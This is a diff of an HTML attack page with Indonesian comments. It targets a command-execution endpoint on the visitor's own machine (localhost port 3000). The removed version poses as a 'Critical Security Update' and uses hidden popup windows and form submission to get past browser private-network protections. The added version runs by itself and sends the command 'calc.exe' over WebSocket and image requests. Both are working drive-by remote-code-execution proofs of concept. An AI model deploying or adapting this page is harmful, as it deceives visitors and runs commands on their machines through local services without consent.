@@ -1,69 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Critical Security Update - Chromium Research</title>
+    <title>FULL SYSTEM ACCESS - RESEARCH</title>
 </head>
-<body style="background: black; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px;">
-    <h1>SYSTEM UPDATE IN PROGRESS</h1>
-    <p style="color: red;">[!] DO NOT CLOSE THIS WINDOW</p>
-    <div id="logs" style="text-align: left; display: inline-block; width: 80%; border: 1px solid #333; padding: 10px; background: #0a0a0a;"></div>
-    
-    <p style="margin-top: 20px; color: #555;">Click anywhere to speed up the process...</p>
+<body style="background: black; color: white; font-family: monospace; text-align: center; padding-top: 100px;">
+    <h1 style="color: red;">CRITICAL EXPLOIT STATUS: <span id="status">PENDING</span></h1>
+    <div id="logs" style="background: #111; color: #0f0; padding: 20px; border: 2px solid red; display: inline-block; width: 80%; text-align: left;"></div>
 
     <script>
-        const log = (msg) => {
-            document.getElementById('logs').innerHTML += `[+] ${msg}<br>`;
-        };
+        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
 
-        function deployPayload() {
-            log("Initializing PNA Bypass...");
+        function fullExploit() {
+            document.getElementById('status').innerText = "EXECUTING...";
             
-            // Variasi Host untuk membypass filter IP statis
-            const hosts = ["127.0.0.1", "0.0.0.0", "[::1]"];
-            const cmd = "calc.exe";
+            // List target IP
+            const targets = ["127.0.0.1", "0.0.0.0", "localhost"];
             
-            hosts.forEach((host) => {
-                const targetUrl = `http://${host}:3000/exec?cmd=${encodeURIComponent(cmd)}`;
-                log(`Targeting: ${host}...`);
-
-                // TEKNIK 1: Form Smuggling (Bypass Mixed Content)
-                // Menggunakan form dengan target _blank adalah cara paling ampuh
-                // karena browser menganggapnya sebagai navigasi, bukan sub-resource.
-                const form = document.createElement('form');
-                form.method = "GET";
-                form.action = targetUrl;
-                form.target = "_blank"; // Membuka tab baru (bisa dipicu lewat window.open)
-                document.body.appendChild(form);
+            targets.forEach(ip => {
+                log(`Attempting WebSocket Injection on ws://${ip}:3000...`);
                 
-                // TEKNIK 2: Window Popup (Memicu eksekusi di 'background' tab)
-                const pwn = window.open("", `pwn_${host}`, "width=1,height=1,left=9999,top=9999");
-                if (pwn) {
-                    form.target = `pwn_${host}`;
-                    form.submit();
-                    log(`Payload sent to ${host} via Frame Smuggling`);
+                try {
+                    const ws = new WebSocket(`ws://${ip}:3000`);
                     
-                    // Tutup jendela popup setelah sukses mengirim
-                    setTimeout(() => pwn.close(), 2000);
-                } else {
-                    log(`Popup blocked for ${host}, attempting fallback...`);
-                    // Fallback: Langsung submit (mungkin terlihat oleh user, tapi tembus)
-                    form.submit();
+                    ws.onopen = () => {
+                        log(`[SUCCESS] Connected to ${ip}! Sending RCE payload...`);
+                        ws.send("calc.exe"); // Perintah RCE
+                        document.getElementById('status').innerText = "PWNED!";
+                    };
+
+                    ws.onerror = () => {
+                        log(`[FAILED] WebSocket at ${ip} blocked or server down.`);
+                    };
+                } catch (e) {
+                    log(`[ERROR] ${e.message}`);
                 }
+
+                // BACKUP: Tetap kirim via Image untuk pancingan
+                const img = new Image();
+                img.src = `http://${ip}:3000/exec?cmd=calc.exe`;
             });
         }
 
-        // AUTO-TRIGGER: Chrome memblokir window.open otomatis. 
-        // User harus melakukan setidaknya 1 kali klik di halaman.
-        window.onclick = () => {
-            deployPayload();
-            log("Deployment complete.");
-        };
-
-        // Coba jalankan otomatis (mungkin gagal jika popup blocker aktif)
-        window.onload = () => {
-            log("System ready. Click anywhere to proceed.");
-            setTimeout(deployPayload, 3000);
-        };
+        // Jalankan saat diklik untuk melewati proteksi interaksi user
+        window.onclick = fullExploit;
+        // Jalankan otomatis
+        setTimeout(fullExploit, 2000);
     </script>
 </body>
 </html>
